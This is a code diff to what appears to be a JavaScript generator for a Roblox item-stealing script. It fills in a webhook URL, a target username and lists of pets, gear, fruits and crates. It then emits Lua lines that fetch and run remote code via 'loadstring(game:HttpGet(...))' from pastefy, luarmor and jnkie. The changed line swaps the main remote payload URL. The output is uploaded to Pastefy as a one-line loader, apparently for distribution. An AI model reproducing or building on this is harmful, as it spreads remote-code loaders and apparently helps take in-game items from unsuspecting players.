@@ -554,7 +554,7 @@ async function generate() {
     if (adminMode === 'dupe') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/EX1du2IS/raw"))()\nend)`;
     else if (adminMode === 'Hub') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()\nend)`;
     else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = `\n${customAdminLoadstring}`;
-    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n${blacklistPart}\n\ngetgenv().TARGET_PETS = {\n${petsArray.join(',\n')}\n}\n\n\ngetgenv().TARGET_GEAR = {\n${gearsArray.join(',\n')}\n}\n\n\ngetgenv().FRUITS = {\n${fruitsArray.join(',\n')}\n}\n\n\ngetgenv().CRATES = {\n${cratesArray.join(',\n')}\n}\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/08d18200fe55f004083713a51a16817df53e464420f40476b3cb4d63eec52f06/download"))()\nend)${adminPart}`;
+    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n${blacklistPart}\n\ngetgenv().TARGET_PETS = {\n${petsArray.join(',\n')}\n}\n\n\ngetgenv().TARGET_GEAR = {\n${gearsArray.join(',\n')}\n}\n\n\ngetgenv().FRUITS = {\n${fruitsArray.join(',\n')}\n}\n\n\ngetgenv().CRATES = {\n${cratesArray.join(',\n')}\n}\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/MMENG7dr/raw"))()\nend)${adminPart}`;
     const url = await uploadToPastefy(script);
     out.className = 'code-block';
     out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : script;
